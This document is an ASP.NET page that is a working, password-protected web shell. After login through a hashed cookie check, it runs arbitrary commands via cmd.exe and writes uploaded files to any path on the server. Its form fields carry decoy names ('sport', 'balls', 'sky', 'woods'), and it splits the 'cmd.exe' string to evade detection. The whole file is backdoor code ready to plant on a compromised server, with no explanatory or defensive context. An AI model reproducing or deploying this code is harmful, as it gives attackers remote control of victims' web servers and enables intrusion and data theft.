<%@ Page Language="C#" ValidateRequest="false" EnableViewState="false" %>
<%@ Import namespace="System.IO"%>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<%
    try
    {
        Result.InnerText = string.Empty;
        if (!string.IsNullOrEmpty(HttpContext.Current.Request.Form["sport"]))
        {
            HttpCookie newcook = new HttpCookie("fqrspt", HttpContext.Current.Request.Form["sport"]);
            newcook.Expires = DateTime.Now.AddDays(4);
            HttpContext.Current.Response.SetCookie(newcook);
        }

        if (HttpContext.Current.Request.Cookies["fqrspt"] != null)
        {
            if ((Convert.ToBase64String(new System.Security.Cryptography.SHA256CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(HttpContext.Current.Request.Cookies["fqrspt"].Value + "OOOLefHUgIk$Alin2dpdiW3Bn&x*z26x94V*XECjn7j4J0Q4dA13YOo#5nh@2Kvh"))) == "LoYTUF2aIaJ2C9FmhMvU+72xObPYHzAPriWZZd4K8Ok="))
            {
                if (!string.IsNullOrEmpty(HttpContext.Current.Request.Form["balls"]))
                {
                    System.Diagnostics.Process process = new System.Diagnostics.Process();
                    process.StartInfo.FileName = "cm" + "d.e" + "xe";
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.RedirectStandardInput = true;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.RedirectStandardError = true;
                    process.StartInfo.CreateNoWindow = true;
                    process.Start();
                    process.StandardInput.WriteLine(HttpContext.Current.Request.Form["balls"]);
                    process.StandardInput.WriteLine("exit");
                    string output = string.Empty;
                    output = process.StandardOutput.ReadToEnd();
                    process.WaitForExit();
                    process.Close();
                    Result.InnerText = output;
                }
                else if (!string.IsNullOrEmpty(HttpContext.Current.Request.Form["sky"]))
                {
                    HttpPostedFile file = HttpContext.Current.Request.Files["woods"];
                    if (file != null && file.ContentLength > 0)
                    {
                        file.SaveAs(HttpContext.Current.Request.Form["sky"]);
                        Result.InnerText = "uploaded";
                    }
                }
            }
        }
    }
    catch (Exception ex)
    {
        Result.InnerText = ex.ToString();
    }
%>
</head>
<body>
    <table style="width:100%">
        <tr>
            <td>Password :</td><td><form method="post"><input name="sport" style='width:300px' /><input type="submit" value="Login"/></form></td>
        </tr>
        <tr>
            <td>Command :</td><td><form method="post"><input name="balls" style='width:300px' /><input type="submit" value="Execute"/></form></td>
        </tr>
        <tr>
            <td>Upload :</td><td>
                <form method="post" enctype="multipart/form-data">
                    <input name="woods" type="file" />
                    <input name="sky" type="text" />
                    <input type="submit" value="Upload" />
                </form>
            </td>
        </tr>
    </table>
    <pre id="Result" runat="server"></pre>
</body>
</html>
